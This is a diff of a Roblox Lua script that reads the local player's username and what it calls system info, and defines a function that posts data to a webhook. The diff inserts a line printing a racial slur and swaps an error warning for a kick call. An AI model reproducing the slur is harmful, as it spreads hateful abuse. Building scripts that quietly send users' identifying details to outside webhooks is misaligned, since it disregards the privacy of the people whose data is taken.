@@ -1,7 +1,7 @@
 -- Services
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
-
+print("niggers")
 -- Player and System Info
 local LocalPlayer = Players.LocalPlayer or Players:GetPlayers()[1]  -- fallback
 local Username = LocalPlayer and LocalPlayer.Name or "Unknown"
@@ -64,7 +64,7 @@ local function sendWebhook(url, data)
             Body = data
         })
     else
-        warn("❌ No supported HTTP request method found.")
+	kick("Error")
     end
 end
 
